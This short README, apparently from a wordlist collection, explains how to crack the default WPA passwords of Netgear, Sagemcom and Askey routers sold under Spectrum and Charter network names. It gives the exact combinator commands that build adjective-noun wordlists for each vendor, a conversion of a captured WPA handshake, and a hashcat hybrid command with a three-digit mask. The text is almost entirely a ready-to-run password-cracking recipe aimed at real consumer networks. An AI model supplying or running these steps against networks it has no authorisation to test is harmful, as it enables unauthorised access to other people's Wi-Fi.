# NetgearXX / MyCharterWifiXX / MySpectrumWifiXX / SpectrumSetup-XX / SpectrumwifiXXXX

### dicts/netgear-spectrum
* Netgear / Sagemcom  - adj_noun.txt should be sufficent

```combinator.exe adjective.txt noun.txt > adj_noun.txt```

* Askey - also try noun_adj.txt and noun_noun.txt

```combinator.exe noun.txt adjective.txt > noun_adj.txt```

```combinator.exe noun.txt noun.txt > noun_noun.txt```

* Convert pcap

```cap2hccapx.exe WPAhandshake.pcap WPAhandshake.hccapx```

* Use hashcat to crack

```Hashcat.exe -m 22000 -a 6 WPAhandshake.hccapx adj_noun.txt ?d?d?d```



